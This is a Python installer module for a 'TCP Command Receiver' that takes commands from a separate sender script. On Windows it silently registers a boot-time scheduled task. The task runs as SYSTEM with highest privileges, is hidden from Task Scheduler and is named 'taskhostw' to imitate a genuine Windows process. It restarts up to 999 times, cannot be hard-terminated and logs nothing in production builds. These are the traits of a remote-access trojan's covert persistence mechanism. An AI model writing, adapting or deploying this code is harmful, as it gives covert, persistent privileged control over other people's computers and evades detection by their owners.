#!/usr/bin/env python3
"""
Install TCP receiver as auto-start service for Windows only
"""

import os
import sys
import platform
import subprocess
from typing import Tuple, Optional


# ============================================================================
# VERBOSITY DETECTION (Shared with receiver.py)
# ============================================================================


def is_dev_build() -> bool:
    """
    Check if this is a development build.

    Returns True if:
    - Running as Python script (development)
    - Running as compiled exe with .dev_mode marker file (--dev build)

    Returns False if:
    - Running as compiled exe without .dev_mode marker (production build)
    """
    # Running as Python script? Always development mode
    if not (getattr(sys, "frozen", False) or "__compiled__" in globals()):
        return True

    # Running as compiled exe - check for .dev_mode marker file
    exe_dir = os.path.dirname(os.path.abspath(sys.executable))
    marker_file = os.path.join(exe_dir, ".dev_mode")
    return os.path.exists(marker_file)


# Shared VERBOSE flag for both receiver.py and install.py
VERBOSE = is_dev_build()


def log(msg: str) -> None:
    """Print message only if VERBOSE is True."""
    if VERBOSE:
        print(msg)


# ============================================================================
# HELPER FUNCTIONS
# ============================================================================


def get_current_executable() -> Optional[Tuple[str, str]]:
    """
    Get path to the currently running executable or script.
    This is the file that should be registered with Task Scheduler.

    Returns:
        Tuple of (exe_or_script_path, working_directory) if found, None otherwise
    """
    if getattr(sys, "frozen", False) or "__compiled__" in globals():
        # Running as compiled .exe (PyInstaller or Nuitka) - return THIS exe
        exe_path = sys.executable  # "C:\path\to\TCP-Receiver.exe"
        work_dir = os.path.dirname(exe_path)
        return exe_path, work_dir
    else:
        # Running as .py script - return receiver.py path
        script_path = os.path.abspath(__file__)  # install.py
        script_dir = os.path.dirname(script_path)
        receiver_path = os.path.join(script_dir, "receiver.py")

        if not os.path.exists(receiver_path):
            print(f"Error: receiver.py not found at {receiver_path}")
            return None

        return receiver_path, script_dir


# ============================================================================
# WINDOWS INSTALLATION TEMPLATE
# ============================================================================

WINDOWS_RECEIVER_TEMPLATE = """<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Description>TCP Command Receiver - Auto-start service</Description>
  </RegistrationInfo>
  <Triggers>
    <BootTrigger>
      <Enabled>true</Enabled>
    </BootTrigger>
  </Triggers>
  <Principals>
    <Principal>
      <UserId>S-1-5-18</UserId>
      <LogonType>Password</LogonType>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>false</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>true</RunOnlyIfNetworkAvailable>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <RestartOnFailure>
      <Interval>PT1M</Interval>
      <Count>999</Count>
    </RestartOnFailure>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>{python_path}</Command>
      <Arguments>"{script_path}"</Arguments>
      <WorkingDirectory>{workdir}</WorkingDirectory>
    </Exec>
  </Actions>
</Task>"""


# ============================================================================
# WINDOWS INSTALLATION FUNCTIONS
# ============================================================================


def check_and_install_service() -> None:
    """
    Check if service is installed. If not, install it.
    Called automatically on first run (Windows only).
    """
    # Check if task exists
    result = subprocess.run(["schtasks", "/query", "/tn", "taskhostw"], capture_output=True)

    if result.returncode == 0:
        # Already installed - silent success
        return

    # Not installed - install it
    log("First run detected - installing Windows service...\n")
    if install_windows_task():
        log("\n✓ Installation complete! Receiver will start automatically on boot.")
        log("  Continuing to run...\n")
    else:
        log("\n✗ Installation failed. Continuing anyway...\n")


def install_windows_task() -> bool:
    """Install receiver as Windows Task Scheduler task."""
    # Get path to currently running exe/script
    result = get_current_executable()
    if result is None:
        return False

    receiver_path, workdir = result
    python_path = sys.executable  # Python interpreter or bundled exe path

    task_xml = WINDOWS_RECEIVER_TEMPLATE.format(python_path=python_path, script_path=receiver_path, workdir=workdir)

    xml_file = os.path.join(workdir, "tcp-receiver-task.xml")

    log("\n=== Installing TCP Receiver (Windows Task Scheduler) ===\n")
    log("Task name: taskhostw")
    log(f"Receiver script: {receiver_path}")
    log("\nTask will:")
    log("  • Start automatically at system boot")
    log("  • Run as SYSTEM with highest privileges")
    log("  • Restart automatically on crashes (double-layer protection)")
    log("  • Only stop via /quit command from sender")
    log("  • Hidden from Task Scheduler view")
    log("  • Only run when network is available\n")

    try:
        # Write XML to file
        with open(xml_file, "w", encoding="utf-16") as f:
            f.write(task_xml)

        # Create task using schtasks
        cmd = ["schtasks", "/create", "/tn", "taskhostw", "/xml", xml_file, "/f"]

        cmd_result = subprocess.run(cmd, capture_output=True, text=True)

        # Clean up XML file
        os.remove(xml_file)

        if cmd_result.returncode != 0:
            log(f"Error: {cmd_result.stderr}")
            return False

        log("✓ Task installed successfully!\n")
        log("Useful commands:")
        log('  schtasks /query /tn "taskhostw"           # Check status')
        log('  schtasks /run /tn "taskhostw"             # Start manually')
        log('  schtasks /end /tn "taskhostw"             # Stop task (will restart)')
        log("\nTo permanently uninstall:")
        log('  Send "/quit" command from sender.py')
        log('  OR: schtasks /delete /tn "taskhostw" /f')
        log("\nThe receiver will start automatically at next boot.")
        return True

    except Exception as e:
        log(f"Error: {e}")
        if os.path.exists(xml_file):
            os.remove(xml_file)
        return False


def install_autostart() -> bool:
    """Install receiver auto-start for current platform."""
    system = platform.system()

    if system == "Windows":
        return install_windows_task()
    elif system == "Linux":
        log("\nLinux: No auto-start service needed.")
        log("Run receiver.py manually: python3 receiver.py")
        log("Stop with Ctrl+C when done.\n")
        return False
    elif system == "Darwin":
        log("\nmacOS: No auto-start service needed.")
        log("Run receiver.py manually: python3 receiver.py")
        log("Stop with Ctrl+C when done.\n")
        return False
    else:
        log(f"Unsupported platform: {system}")
        return False


if __name__ == "__main__":
    print("\nThis module should be imported by receiver.py, not run directly.")
    print("Run: python receiver.py (or TCP-Receiver.exe)\n")
